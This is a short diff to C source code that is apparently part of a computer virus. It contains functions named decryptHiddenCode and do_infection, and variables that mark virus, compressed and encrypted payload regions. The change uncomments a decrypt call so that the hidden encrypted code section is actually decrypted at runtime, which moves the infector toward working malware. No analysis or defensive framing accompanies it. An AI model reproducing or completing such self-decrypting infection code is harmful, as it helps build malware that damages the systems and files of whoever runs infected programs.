@@ -51,7 +51,7 @@ void change_garbage_code(){
 int __start decryptHiddenCode(){
 	uint32_t *k = (uint32_t *)key;
 	//-- decrypt z2        ------
-	//decrypt(&cmpr_start, ((size_t)&cmpr_end) - ((size_t)&cmpr_start), k, FALSE);
+	decrypt(&cmpr_start, ((size_t)&cmpr_end) - ((size_t)&cmpr_start), k, FALSE);
 
 	//-- decrypt z3        ------
 	char *s = ((char*)&crypt_start);
@@ -72,6 +72,7 @@ int __start decryptHiddenCode(){
 void do_infection(){
         char *virus = (char *)&bin_start;
         size_t virus_len = ((size_t)&bin_end) - ((size_t)&bin_start);
+
         size_t cmpr_off = ((size_t)&cmpr_start) - ((size_t)&bin_start);
         size_t cmpr_len = ((size_t)&cmpr_end) - ((size_t)&cmpr_start);
 
